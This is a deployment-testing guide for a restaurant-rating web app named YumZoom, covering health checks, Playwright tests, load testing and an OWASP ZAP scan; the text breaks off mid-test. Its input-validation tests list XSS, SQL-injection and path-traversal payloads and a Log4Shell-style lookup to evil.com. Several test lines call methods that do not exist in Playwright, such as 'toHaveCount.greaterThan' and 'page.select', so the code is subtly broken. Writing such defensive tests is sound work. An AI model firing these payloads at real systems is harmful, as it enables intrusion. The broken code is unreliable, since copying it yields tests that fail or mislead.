# YumZoom Production Deployment Guide - Part 4: Post-Deployment Verification & Testing
## Comprehensive Testing and Validation

---

## Table of Contents

1. [Deployment Verification](#deployment-verification)
2. [Smoke Testing](#smoke-testing)
3. [Integration Testing](#integration-testing)
4. [Performance Testing](#performance-testing)
5. [Security Testing](#security-testing)
6. [Third-Party Integration Testing](#third-party-integration-testing)
7. [User Acceptance Testing](#user-acceptance-testing)
8. [Load Testing](#load-testing)

---

## Deployment Verification

### Step 1: Basic Deployment Health Checks

#### 1.1 Application Status Verification
```bash
# Check application health endpoint
curl -f https://yumzoom.app/api/health

# Verify expected response
{
  "status": "healthy",
  "timestamp": "2025-08-23T10:30:00.000Z",
  "response_time": 85,
  "checks": {
    "database": true,
    "redis": true,
    "external_apis": true
  },
  "version": "1.0.0"
}
```

#### 1.2 Database Connectivity Test
```typescript
// scripts/verify-database.ts
import { createClient } from '@supabase/supabase-js';

async function verifyDatabaseConnection() {
  console.log('🔍 Verifying database connection...');
  
  const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  try {
    // Test basic connection
    const { data: connectionTest, error: connectionError } = await supabase
      .from('restaurants')
      .select('count(*)', { count: 'exact', head: true });
    
    if (connectionError) throw connectionError;
    
    console.log(`✅ Database connected. Restaurant count: ${connectionTest?.length || 0}`);
    
    // Test RLS policies
    const { data: rlsTest, error: rlsError } = await supabase
      .from('user_profiles')
      .select('id')
      .limit(1);
    
    if (rlsError && !rlsError.message.includes('RLS')) {
      throw new Error(`RLS test failed: ${rlsError.message}`);
    }
    
    console.log('✅ RLS policies active');
    
    // Test database functions
    const { data: functionTest, error: functionError } = await supabase
      .rpc('nearby_restaurants_optimized', {
        lat: 40.7128,
        lng: -74.0060,
        distance_km: 10,
        limit_count: 5
      });
    
    if (functionError) throw functionError;
    
    console.log(`✅ Database functions working. Found ${functionTest?.length || 0} nearby restaurants`);
    
    return true;
  } catch (error) {
    console.error('❌ Database verification failed:', error);
    return false;
  }
}
```

#### 1.3 Redis Cache Verification
```typescript
// scripts/verify-redis.ts
import Redis from 'ioredis';

async function verifyRedisConnection() {
  console.log('🔍 Verifying Redis connection...');
  
  const redis = new Redis(process.env.REDIS_URL!);
  
  try {
    // Test basic operations
    await redis.set('test:deployment', 'verification', 'EX', 60);
    const result = await redis.get('test:deployment');
    
    if (result !== 'verification') {
      throw new Error('Redis read/write test failed');
    }
    
    console.log('✅ Redis read/write operations working');
    
    // Test cache invalidation
    await redis.del('test:deployment');
    const deleted = await redis.get('test:deployment');
    
    if (deleted !== null) {
      throw new Error('Redis deletion test failed');
    }
    
    console.log('✅ Redis cache invalidation working');
    
    // Test performance
    const start = Date.now();
    await Promise.all([
      redis.set('perf:1', 'test'),
      redis.set('perf:2', 'test'),
      redis.set('perf:3', 'test'),
      redis.get('perf:1'),
      redis.get('perf:2'),
      redis.get('perf:3')
    ]);
    const duration = Date.now() - start;
    
    console.log(`✅ Redis performance test: ${duration}ms for 6 operations`);
    
    await redis.disconnect();
    return true;
  } catch (error) {
    console.error('❌ Redis verification failed:', error);
    await redis.disconnect();
    return false;
  }
}
```

---

## Smoke Testing

### Step 1: Critical Path Testing

#### 1.1 User Authentication Flow
```typescript
// tests/smoke/auth-flow.test.ts
import { test, expect } from '@playwright/test';

test.describe('Authentication Smoke Tests', () => {
  test('user registration flow', async ({ page }) => {
    await page.goto('/');
    
    // Navigate to registration
    await page.click('[data-testid="sign-up-button"]');
    await expect(page).toHaveURL('/auth/register');
    
    // Fill registration form
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    await page.fill('[data-testid="confirm-password-input"]', 'SecurePass123!');
    await page.fill('[data-testid="first-name-input"]', 'Test');
    await page.fill('[data-testid="last-name-input"]', 'User');
    
    // Submit registration
    await page.click('[data-testid="register-submit"]');
    
    // Verify success redirect
    await expect(page).toHaveURL('/dashboard');
    await expect(page.locator('[data-testid="welcome-message"]')).toBeVisible();
  });

  test('user login flow', async ({ page }) => {
    await page.goto('/auth/login');
    
    // Fill login form
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    
    // Submit login
    await page.click('[data-testid="login-submit"]');
    
    // Verify success
    await expect(page).toHaveURL('/dashboard');
    await expect(page.locator('[data-testid="user-menu"]')).toBeVisible();
  });

  test('logout flow', async ({ page }) => {
    // Login first
    await page.goto('/auth/login');
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    await page.click('[data-testid="login-submit"]');
    
    // Logout
    await page.click('[data-testid="user-menu"]');
    await page.click('[data-testid="logout-button"]');
    
    // Verify logout
    await expect(page).toHaveURL('/');
    await expect(page.locator('[data-testid="sign-up-button"]')).toBeVisible();
  });
});
```

#### 1.2 Restaurant Search and Rating Flow
```typescript
// tests/smoke/restaurant-flow.test.ts
import { test, expect } from '@playwright/test';

test.describe('Restaurant Flow Smoke Tests', () => {
  test.beforeEach(async ({ page }) => {
    // Login before each test
    await page.goto('/auth/login');
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    await page.click('[data-testid="login-submit"]');
    await expect(page).toHaveURL('/dashboard');
  });

  test('restaurant search functionality', async ({ page }) => {
    await page.goto('/search');
    
    // Perform search
    await page.fill('[data-testid="search-input"]', 'pizza');
    await page.click('[data-testid="search-button"]');
    
    // Verify results
    await expect(page.locator('[data-testid="restaurant-card"]')).toHaveCount.greaterThan(0);
    await expect(page.locator('[data-testid="search-results-count"]')).toBeVisible();
  });

  test('restaurant rating submission', async ({ page }) => {
    await page.goto('/restaurants');
    
    // Click on first restaurant
    await page.click('[data-testid="restaurant-card"]:first-child');
    
    // Navigate to rating form
    await page.click('[data-testid="rate-restaurant-button"]');
    
    // Fill rating form
    await page.click('[data-testid="rating-star-8"]'); // 8 out of 10
    await page.fill('[data-testid="review-text"]', 'Great family restaurant with excellent food quality.');
    
    // Submit rating
    await page.click('[data-testid="submit-rating"]');
    
    // Verify success
    await expect(page.locator('[data-testid="rating-success-message"]')).toBeVisible();
    await expect(page.locator('[data-testid="user-rating"]')).toContainText('8');
  });

  test('family member rating', async ({ page }) => {
    // Add family member first
    await page.goto('/family');
    await page.click('[data-testid="add-family-member"]');
    await page.fill('[data-testid="member-name"]', 'Child Test');
    await page.select('[data-testid="member-age"]', '8');
    await page.click('[data-testid="save-family-member"]');
    
    // Rate restaurant for family member
    await page.goto('/restaurants');
    await page.click('[data-testid="restaurant-card"]:first-child');
    await page.click('[data-testid="rate-for-family"]');
    
    // Select family member
    await page.select('[data-testid="family-member-select"]', 'Child Test');
    await page.click('[data-testid="rating-star-9"]');
    await page.fill('[data-testid="family-review"]', 'Kid loved the pizza!');
    
    // Submit family rating
    await page.click('[data-testid="submit-family-rating"]');
    
    // Verify success
    await expect(page.locator('[data-testid="family-rating-success"]')).toBeVisible();
  });
});
```

### Step 2: API Endpoint Testing

#### 2.1 Restaurant API Testing
```typescript
// tests/smoke/api-endpoints.test.ts
import { test, expect } from '@playwright/test';

test.describe('API Endpoint Smoke Tests', () => {
  let authToken: string;

  test.beforeAll(async ({ request }) => {
    // Get auth token for API testing
    const response = await request.post('/api/auth/login', {
      data: {
        email: 'test@example.com',
        password: 'SecurePass123!'
      }
    });
    
    const data = await response.json();
    authToken = data.token;
  });

  test('GET /api/restaurants endpoint', async ({ request }) => {
    const response = await request.get('/api/restaurants', {
      headers: {
        'Authorization': `Bearer ${authToken}`
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    expect(data).toHaveProperty('restaurants');
    expect(Array.isArray(data.restaurants)).toBe(true);
    expect(data).toHaveProperty('pagination');
  });

  test('GET /api/restaurants/search endpoint', async ({ request }) => {
    const response = await request.get('/api/restaurants/search?query=pizza&lat=40.7128&lng=-74.0060', {
      headers: {
        'Authorization': `Bearer ${authToken}`
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    expect(data).toHaveProperty('results');
    expect(Array.isArray(data.results)).toBe(true);
  });

  test('POST /api/ratings endpoint', async ({ request }) => {
    // Get a restaurant ID first
    const restaurantsResponse = await request.get('/api/restaurants?limit=1', {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    const restaurantsData = await restaurantsResponse.json();
    const restaurantId = restaurantsData.restaurants[0].id;
    
    const response = await request.post('/api/ratings', {
      headers: {
        'Authorization': `Bearer ${authToken}`,
        'Content-Type': 'application/json'
      },
      data: {
        restaurant_id: restaurantId,
        rating: 8,
        review_text: 'API test rating'
      }
    });
    
    expect(response.status()).toBe(201);
    
    const data = await response.json();
    expect(data).toHaveProperty('id');
    expect(data.rating).toBe(8);
  });

  test('GET /api/user/profile endpoint', async ({ request }) => {
    const response = await request.get('/api/user/profile', {
      headers: {
        'Authorization': `Bearer ${authToken}`
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    expect(data).toHaveProperty('email');
    expect(data).toHaveProperty('first_name');
    expect(data).toHaveProperty('last_name');
  });
});
```

---

## Integration Testing

### Step 1: Third-Party Service Integration Tests

#### 1.1 Google Maps Integration Test
```typescript
// tests/integration/google-maps.test.ts
import { test, expect } from '@playwright/test';

test.describe('Google Maps Integration', () => {
  test('maps API key validation', async ({ request }) => {
    const response = await request.get(`https://maps.googleapis.com/maps/api/js?key=${process.env.GOOGLE_MAPS_API_KEY}`);
    expect(response.status()).toBe(200);
  });

  test('places autocomplete functionality', async ({ page }) => {
    await page.goto('/search');
    
    // Type in location search
    await page.fill('[data-testid="location-input"]', 'New York');
    
    // Wait for autocomplete suggestions
    await expect(page.locator('[data-testid="location-suggestion"]')).toHaveCount.greaterThan(0);
    
    // Click on first suggestion
    await page.click('[data-testid="location-suggestion"]:first-child');
    
    // Verify location is set
    await expect(page.locator('[data-testid="location-input"]')).toHaveValue(/New York/);
  });

  test('restaurant location display on map', async ({ page }) => {
    await page.goto('/restaurants');
    await page.click('[data-testid="restaurant-card"]:first-child');
    
    // Wait for map to load
    await expect(page.locator('[data-testid="restaurant-map"]')).toBeVisible();
    await expect(page.locator('.gm-style')).toBeVisible(); // Google Maps container
  });
});
```

#### 1.2 Stripe Payment Integration Test
```typescript
// tests/integration/stripe-payment.test.ts
import { test, expect } from '@playwright/test';
import Stripe from 'stripe';

test.describe('Stripe Payment Integration', () => {
  test('stripe API connection', async () => {
    const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!, {
      apiVersion: '2023-10-16'
    });
    
    try {
      const account = await stripe.accounts.retrieve();
      expect(account).toHaveProperty('id');
      console.log('✅ Stripe API connected successfully');
    } catch (error) {
      throw new Error(`Stripe API test failed: ${error.message}`);
    }
  });

  test('payment intent creation', async ({ request }) => {
    const response = await request.post('/api/payments/create-intent', {
      headers: {
        'Content-Type': 'application/json'
      },
      data: {
        amount: 1999, // $19.99
        currency: 'usd',
        description: 'Test payment'
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    expect(data).toHaveProperty('client_secret');
    expect(data).toHaveProperty('payment_intent_id');
  });

  test('webhook signature validation', async ({ request }) => {
    const webhookSecret = process.env.STRIPE_WEBHOOK_SECRET!;
    const payload = JSON.stringify({
      id: 'evt_test_webhook',
      object: 'event',
      type: 'payment_intent.succeeded'
    });
    
    // Create test signature
    const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);
    const signature = stripe.webhooks.generateTestHeaderString({
      payload,
      secret: webhookSecret
    });
    
    const response = await request.post('/api/webhooks/stripe', {
      headers: {
        'stripe-signature': signature,
        'Content-Type': 'application/json'
      },
      data: payload
    });
    
    expect(response.status()).toBe(200);
  });
});
```

#### 1.3 Email Service Integration Test
```typescript
// tests/integration/email-service.test.ts
import { test, expect } from '@playwright/test';

test.describe('Email Service Integration', () => {
  test('email service API validation', async ({ request }) => {
    // Test Resend API
    const response = await request.get('https://api.resend.com/domains', {
      headers: {
        'Authorization': `Bearer ${process.env.RESEND_API_KEY}`
      }
    });
    
    expect(response.status()).toBe(200);
    console.log('✅ Resend API connected successfully');
  });

  test('welcome email sending', async ({ request }) => {
    const response = await request.post('/api/emails/send-welcome', {
      headers: {
        'Content-Type': 'application/json'
      },
      data: {
        email: 'test@example.com',
        firstName: 'Test',
        lastName: 'User'
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    expect(data).toHaveProperty('message_id');
  });

  test('rating notification email', async ({ request }) => {
    const response = await request.post('/api/emails/rating-notification', {
      headers: {
        'Content-Type': 'application/json'
      },
      data: {
        restaurantEmail: 'restaurant@example.com',
        restaurantName: 'Test Restaurant',
        rating: 8,
        reviewText: 'Great food!',
        customerName: 'Test User'
      }
    });
    
    expect(response.status()).toBe(200);
  });
});
```

---

## Performance Testing

### Step 1: Load Testing Configuration

#### 1.1 Artillery Load Testing Setup
```yaml
# tests/performance/load-test.yml
config:
  target: 'https://yumzoom.app'
  phases:
    - duration: 60
      arrivalRate: 5
      name: "Warm up phase"
    - duration: 120
      arrivalRate: 10
      name: "Ramp up load"
    - duration: 300
      arrivalRate: 20
      name: "Sustained load"
    - duration: 60
      arrivalRate: 5
      name: "Cool down"
  defaults:
    headers:
      Content-Type: 'application/json'
  plugins:
    expect: {}
    metrics-by-endpoint: {}

scenarios:
  - name: "Restaurant search flow"
    weight: 40
    flow:
      - get:
          url: "/"
          expect:
            - statusCode: 200
      - get:
          url: "/api/restaurants"
          expect:
            - statusCode: 200
            - hasProperty: 'restaurants'
      - get:
          url: "/api/restaurants/search?query=pizza"
          expect:
            - statusCode: 200

  - name: "User authentication flow"
    weight: 30
    flow:
      - post:
          url: "/api/auth/login"
          json:
            email: "test{{ $randomString() }}@example.com"
            password: "TestPassword123!"
          expect:
            - statusCode: [200, 401] # Accept both success and expected failures

  - name: "Restaurant details and rating"
    weight: 20
    flow:
      - get:
          url: "/api/restaurants"
          capture:
            json: "$[0].id"
            as: "restaurantId"
      - get:
          url: "/api/restaurants/{{ restaurantId }}"
          expect:
            - statusCode: 200
      - get:
          url: "/api/restaurants/{{ restaurantId }}/ratings"
          expect:
            - statusCode: 200

  - name: "Static asset loading"
    weight: 10
    flow:
      - get:
          url: "/_next/static/css/app.css"
          expect:
            - statusCode: 200
      - get:
          url: "/_next/static/chunks/main.js"
          expect:
            - statusCode: 200
```

#### 1.2 Performance Monitoring Script
```typescript
// scripts/performance-monitoring.ts
import { chromium } from 'playwright';

async function runPerformanceTest() {
  console.log('🚀 Starting performance monitoring...');
  
  const browser = await chromium.launch();
  const page = await browser.newPage();
  
  // Enable performance metrics
  await page.coverage.startJSCoverage();
  await page.coverage.startCSSCoverage();
  
  const metrics = {
    pages: [],
    totalTime: 0,
    startTime: Date.now()
  };
  
  const testPages = [
    { name: 'Homepage', url: '/' },
    { name: 'Search Page', url: '/search' },
    { name: 'Restaurants List', url: '/restaurants' },
    { name: 'Login Page', url: '/auth/login' }
  ];
  
  for (const testPage of testPages) {
    console.log(`Testing ${testPage.name}...`);
    
    const startTime = Date.now();
    
    // Navigate and wait for load
    await page.goto(`https://yumzoom.app${testPage.url}`, {
      waitUntil: 'networkidle'
    });
    
    // Get performance metrics
    const performanceMetrics = await page.evaluate(() => {
      const navigation = performance.getEntriesByType('navigation')[0] as PerformanceNavigationTiming;
      const paint = performance.getEntriesByType('paint');
      
      return {
        domContentLoaded: navigation.domContentLoadedEventEnd - navigation.domContentLoadedEventStart,
        loadComplete: navigation.loadEventEnd - navigation.loadEventStart,
        firstPaint: paint.find(p => p.name === 'first-paint')?.startTime || 0,
        firstContentfulPaint: paint.find(p => p.name === 'first-contentful-paint')?.startTime || 0,
        transferSize: navigation.transferSize,
        encodedBodySize: navigation.encodedBodySize
      };
    });
    
    const totalTime = Date.now() - startTime;
    
    metrics.pages.push({
      name: testPage.name,
      url: testPage.url,
      totalTime,
      ...performanceMetrics
    });
    
    console.log(`✅ ${testPage.name}: ${totalTime}ms`);
  }
  
  // Get JS/CSS coverage
  const jsCoverage = await page.coverage.stopJSCoverage();
  const cssCoverage = await page.coverage.stopCSSCoverage();
  
  const totalJSBytes = jsCoverage.reduce((sum, entry) => sum + entry.text.length, 0);
  const usedJSBytes = jsCoverage.reduce((sum, entry) => {
    return sum + entry.ranges.reduce((rangeSum, range) => {
      return rangeSum + (range.end - range.start);
    }, 0);
  }, 0);
  
  const jsUsagePercentage = (usedJSBytes / totalJSBytes) * 100;
  
  metrics.totalTime = Date.now() - metrics.startTime;
  
  console.log('\n📊 Performance Summary:');
  console.log(`Total test time: ${metrics.totalTime}ms`);
  console.log(`JS usage: ${jsUsagePercentage.toFixed(2)}%`);
  
  metrics.pages.forEach(page => {
    console.log(`\n${page.name}:`);
    console.log(`  Total Time: ${page.totalTime}ms`);
    console.log(`  DOM Content Loaded: ${page.domContentLoaded}ms`);
    console.log(`  First Contentful Paint: ${page.firstContentfulPaint}ms`);
    console.log(`  Transfer Size: ${(page.transferSize / 1024).toFixed(2)}KB`);
  });
  
  await browser.close();
  
  // Check against performance budgets
  const budgets = {
    totalTime: 3000,
    firstContentfulPaint: 2000,
    transferSize: 500 * 1024 // 500KB
  };
  
  let passed = true;
  
  metrics.pages.forEach(page => {
    if (page.totalTime > budgets.totalTime) {
      console.log(`❌ ${page.name} exceeded total time budget: ${page.totalTime}ms > ${budgets.totalTime}ms`);
      passed = false;
    }
    
    if (page.firstContentfulPaint > budgets.firstContentfulPaint) {
      console.log(`❌ ${page.name} exceeded FCP budget: ${page.firstContentfulPaint}ms > ${budgets.firstContentfulPaint}ms`);
      passed = false;
    }
    
    if (page.transferSize > budgets.transferSize) {
      console.log(`❌ ${page.name} exceeded transfer size budget: ${(page.transferSize / 1024).toFixed(2)}KB > ${(budgets.transferSize / 1024).toFixed(2)}KB`);
      passed = false;
    }
  });
  
  if (passed) {
    console.log('\n✅ All performance budgets passed!');
  } else {
    console.log('\n❌ Some performance budgets failed!');
    process.exit(1);
  }
}

if (require.main === module) {
  runPerformanceTest().catch(console.error);
}
```

---

## Security Testing

### Step 1: Security Vulnerability Testing

#### 1.1 OWASP ZAP Integration
```typescript
// tests/security/security-scan.ts
import axios from 'axios';

class SecurityScanner {
  private zapUrl = 'http://localhost:8080';
  private targetUrl = 'https://yumzoom.app';
  
  async runSecurityScan() {
    console.log('🔒 Starting security scan...');
    
    try {
      // Start new session
      await this.zapRequest('/JSON/core/action/newSession/');
      
      // Spider the application
      console.log('🕷️ Spidering application...');
      const spiderResponse = await this.zapRequest('/JSON/spider/action/scan/', {
        url: this.targetUrl,
        maxChildren: 10,
        recurse: true
      });
      
      const spiderScanId = spiderResponse.data.scan;
      await this.waitForSpiderComplete(spiderScanId);
      
      // Active scan
      console.log('🔍 Running active security scan...');
      const activeScanResponse = await this.zapRequest('/JSON/ascan/action/scan/', {
        url: this.targetUrl,
        recurse: true,
        inScopeOnly: false
      });
      
      const activeScanId = activeScanResponse.data.scan;
      await this.waitForActiveScanComplete(activeScanId);
      
      // Generate report
      const alerts = await this.zapRequest('/JSON/core/view/alerts/');
      const report = this.generateSecurityReport(alerts.data);
      
      console.log('\n📋 Security Scan Results:');
      console.log(`High Risk: ${report.highRisk}`);
      console.log(`Medium Risk: ${report.mediumRisk}`);
      console.log(`Low Risk: ${report.lowRisk}`);
      console.log(`Informational: ${report.informational}`);
      
      if (report.highRisk > 0) {
        console.log('\n❌ High risk vulnerabilities found!');
        process.exit(1);
      } else {
        console.log('\n✅ No high risk vulnerabilities found');
      }
      
    } catch (error) {
      console.error('Security scan failed:', error);
      throw error;
    }
  }
  
  private async zapRequest(endpoint: string, params: any = {}) {
    const url = `${this.zapUrl}${endpoint}`;
    return axios.get(url, { params });
  }
  
  private async waitForSpiderComplete(scanId: string) {
    let progress = 0;
    while (progress < 100) {
      await new Promise(resolve => setTimeout(resolve, 1000));
      const response = await this.zapRequest('/JSON/spider/view/status/', { scanId });
      progress = parseInt(response.data.status);
      console.log(`Spider progress: ${progress}%`);
    }
  }
  
  private async waitForActiveScanComplete(scanId: string) {
    let progress = 0;
    while (progress < 100) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      const response = await this.zapRequest('/JSON/ascan/view/status/', { scanId });
      progress = parseInt(response.data.status);
      console.log(`Active scan progress: ${progress}%`);
    }
  }
  
  private generateSecurityReport(alerts: any[]) {
    const report = {
      highRisk: 0,
      mediumRisk: 0,
      lowRisk: 0,
      informational: 0,
      details: []
    };
    
    alerts.forEach(alert => {
      switch (alert.risk) {
        case 'High':
          report.highRisk++;
          break;
        case 'Medium':
          report.mediumRisk++;
          break;
        case 'Low':
          report.lowRisk++;
          break;
        case 'Informational':
          report.informational++;
          break;
      }
      
      report.details.push({
        name: alert.name,
        risk: alert.risk,
        confidence: alert.confidence,
        url: alert.url,
        description: alert.description
      });
    });
    
    return report;
  }
}

// Run security scan
if (require.main === module) {
  const scanner = new SecurityScanner();
  scanner.runSecurityScan().catch(console.error);
}
```

#### 1.2 Input Validation Testing
```typescript
// tests/security/input-validation.test.ts
import { test, expect } from '@playwright/test';

test.describe('Input Validation Security Tests', () => {
  const maliciousInputs = [
    '<script>alert("XSS")</script>',
    '"; DROP TABLE users; --',
    '../../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '<img src="x" onerror="alert(1)">',
    'javascript:alert(document.cookie)',
    '\'; INSERT INTO users VALUES (\'hacker\'); --'
  ];

  test.beforeEach(async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    await page.click('[data-testid="login-submit"]');
  });

  test('XSS protection in restaurant reviews', async ({ page }) => {
    await page.goto('/restaurants');
    await page.click('[data-testid="restaurant-card"]:first-child');
    await page.click('[data-testid="rate-restaurant-button"]');
    
    for (const maliciousInput of maliciousInputs) {
      await page.fill('[data-testid="review-text"]', maliciousInput);
      await page.click('[data-testid="rating-star-5"]');
      await page.click('[data-testid="submit-rating"]');
      
      // Verify XSS is prevented
      const pageContent = await page.content();
      expect(pageContent).not.toContain('<script>');
      expect(pageContent).not.toContain('javascript:');
      
      // Clear the form for next test
      await page.fill('[data-testid="review-text"]', '');
    }
  });

  test('SQL injection protection in search', async ({ page }) => {
    await page.goto('/search');
    
    const sqlInjectionPayloads = [
      "'; DROP TABLE restaurants; --",
      "' UNION SELECT * FROM users --",
      "' OR '1'='1",
      "admin'--",
      "' OR 1=1#"
    ];
    
    for (const payload of sqlInjectionPayloads) {
      await page.fill('[data-testid="search-input"]', payload);
      await page.click('[data-testid="search-button"]');
      
      // Verify no database errors exposed
      const pageContent = await page.textContent('body');
      expect(pageContent).not.toContain('SQL');
      expect(pageContent).not.toContain('database');
      expect(pageContent).not.toContain('error');
    }
  });

  test('CSRF protection on forms', async ({ page }) => {
    // Attempt to submit form without CSRF token
    const response = await page.evaluate(async () => {
      const response = await fetch('/api/ratings', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          restaurant_id: 'test-id',
          rating: 5,
          review_text: 'Test review'
        })
      });
      return response.status;
    });
    
    // Should reject request without proper authentication/CSRF
    expect(response).toBe(401);
  });
});
```

---

## Third-Party Integration Testing

### Step 1: Payment Gateway Testing

#### 1.1 Stripe Integration Test Suite
```typescript
// tests/integration/payment-integration.test.ts
import { test, expect } from '@playwright/test';

test.describe('Payment Integration Tests', () => {
  test('stripe payment flow end-to-end', async ({ page }) => {
    // Login first
    await page.goto('/auth/login');
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    await page.click('[data-testid="login-submit"]');
    
    // Navigate to premium features
    await page.goto('/premium');
    await page.click('[data-testid="upgrade-premium"]');
    
    // Fill payment form with test card
    await page.waitForSelector('iframe[name^="__privateStripeFrame"]');
    
    // Switch to Stripe iframe
    const stripeCardFrame = page.frameLocator('iframe[name^="__privateStripeFrame"]').first();
    await stripeCardFrame.locator('[name="cardnumber"]').fill('4242424242424242');
    await stripeCardFrame.locator('[name="exp-date"]').fill('12/25');
    await stripeCardFrame.locator('[name="cvc"]').fill('123');
    await stripeCardFrame.locator('[name="postal"]').fill('12345');
    
    // Submit payment
    await page.click('[data-testid="submit-payment"]');
    
    // Verify success
    await expect(page.locator('[data-testid="payment-success"]')).toBeVisible();
    await expect(page.locator('[data-testid="premium-features"]')).toBeVisible();
  });

  test('failed payment handling', async ({ page }) => {
    await page.goto('/auth/login');
    await page.fill('[data-testid="email-input"]', 'test@example.com');
    await page.fill('[data-testid="password-input"]', 'SecurePass123!');
    await page.click('[data-testid="login-submit"]');
    
    await page.goto('/premium');
    await page.click('[data-testid="upgrade-premium"]');
    
    // Use declined test card
    const stripeCardFrame = page.frameLocator('iframe[name^="__privateStripeFrame"]').first();
    await stripeCardFrame.locator('[name="cardnumber"]').fill('4000000000000002');
    await stripeCardFrame.locator('[name="exp-date"]').fill('12/25');
    await stripeCardFrame.locator('[name="cvc"]').fill('123');
    await stripeCardFrame.locator('[name="postal"]').fill('12345');
    
    await page.click('[data-testid="submit-payment"]');
    
    // Verify error handling
    await expect(page.locator('[data-testid="payment-error"]')).toBeVisible();
    await expect(page.locator('[data-testid="payment-error"]')).toContainText('declined');
  });
});
```

### Step 2: Delivery Service Integration Testing

#### 2.1 DoorDash API Integration Test
```typescript
// tests/integration/doordash-integration.test.ts
import { test, expect } from '@playwright/test';

test.describe('DoorDash Integration Tests', () => {
  test('restaurant availability check', async ({ request }) => {
    const response = await request.post('/api/delivery/doordash/check-availability', {
      headers: {
        'Content-Type': 'application/json'
      },
      data: {
        restaurant_id: 'test-restaurant-id',
        delivery_address: {
          street: '123 Test St',
          city: 'New York',
          state: 'NY',
          zip: '10001'
        }
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    expect(data).toHaveProperty('available');
    expect(data).toHaveProperty('estimated_delivery_time');
    expect(data).toHaveProperty('delivery_fee');
  });

  test('order placement flow', async ({ request }) => {
    // First check availability
    const availabilityResponse = await request.post('/api/delivery/doordash/check-availability', {
      headers: { 'Content-Type': 'application/json' },
      data: {
        restaurant_id: 'test-restaurant-id',
        delivery_address: {
          street: '123 Test St',
          city: 'New York',
          state: 'NY',
          zip: '10001'
        }
      }
    });
    
    const availability = await availabilityResponse.json();
    
    if (availability.available) {
      // Place test order
      const orderResponse = await request.post('/api/delivery/doordash/place-order', {
        headers: { 'Content-Type': 'application/json' },
        data: {
          restaurant_id: 'test-restaurant-id',
          items: [
            {
              name: 'Test Item',
              quantity: 1,
              price: 12.99
            }
          ],
          delivery_address: {
            street: '123 Test St',
            city: 'New York',
            state: 'NY',
            zip: '10001'
          },
          customer_info: {
            name: 'Test Customer',
            phone: '+1234567890',
            email: 'test@example.com'
          }
        }
      });
      
      expect(orderResponse.status()).toBe(200);
      
      const orderData = await orderResponse.json();
      expect(orderData).toHaveProperty('order_id');
      expect(orderData).toHaveProperty('status');
      expect(orderData.status).toBe('placed');
    }
  });
});
```

---

## User Acceptance Testing

### Step 1: Family Rating Workflow

#### 1.1 Complete Family Rating Journey
```typescript
// tests/acceptance/family-rating-journey.test.ts
import { test, expect } from '@playwright/test';

test.describe('Family Rating User Journey', () => {
  test('complete family dining experience workflow', async ({ page }) => {
    // Step 1: User Registration
    await page.goto('/');
    await page.click('[data-testid="sign-up-button"]');
    
    const userEmail = `family-test-${Date.now()}@example.com`;
    await page.fill('[data-testid="email-input"]', userEmail);
    await page.fill('[data-testid="password-input"]', 'FamilyTest123!');
    await page.fill('[data-testid="confirm-password-input"]', 'FamilyTest123!');
    await page.fill('[data-testid="first-name-input"]', 'Family');
    await page.fill('[data-testid="last-name-input"]', 'Tester');
    await page.click('[data-testid="register-submit"]');
    
    await expect(page).toHaveURL('/dashboard');
    
    // Step 2: Add Family Members
    await page.goto('/family');
    
    // Add first child
    await page.click('[data-testid="add-family-member"]');
    await page.fill('[data-testid="member-name"]', 'Emma');
    await page.selectOption('[data-testid="member-age"]', '8');
    await page.check('[data-testid="dietary-vegetarian"]');
    await page.fill('[data-testid="food-preferences"]', 'Loves pasta, no spicy food');
    await page.click('[data-testid="save-family-member"]');
    
    await expect(page.locator('[data-testid="family-member-card"]')).toContainText('Emma');
    
    // Add second child
    await page.click('[data-testid="add-family-member"]');
    await page.fill('[data-testid="member-name"]', 'Jake');
    await page.selectOption('[data-testid="member-age"]', '12');
    await page.fill('[data-testid="food-preferences"]', 'Pizza lover, allergic to nuts');
    await page.click('[data-testid="save-family-member"]');
    
    // Step 3: Search for Family-Friendly Restaurants
    await page.goto('/search');
    await page.check('[data-testid="family-friendly-filter"]');
    await page.fill('[data-testid="search-input"]', 'pizza');
    await page.click('[data-testid="search-button"]');
    
    await expect(page.locator('[data-testid="restaurant-card"]')).toHaveCount.greaterThan(0);
    
    // Step 4: View Restaurant Details
    await page.click('[data-testid="restaurant-card"]:first-child');
    await expect(page.locator('[data-testid="family-friendly-badge"]')).toBeVisible();
    
    // Step 5: Rate Restaurant for Each Family Member
    await page.click('[data-testid="rate-for-family"]');
    
    // Rate for Emma
    await page.selectOption('[data-testid="family-member-select"]', 'Emma');
    await page.click('[data-testid="rating-star-9"]');
    await page.fill('[data-testid="family-review"]', 'Emma loved the margherita pizza! Perfect portion size.');
    await page.click('[data-testid="submit-family-rating"]');
    
    await expect(page.locator('[data-testid="rating-success"]')).toBeVisible();
    
    // Rate for Jake
    await page.click('[data-testid="rate-for-family"]');
    await page.selectOption('[data-testid="family-member-select"]', 'Jake');
    await page.click('[data-testid="rating-star-7"]');
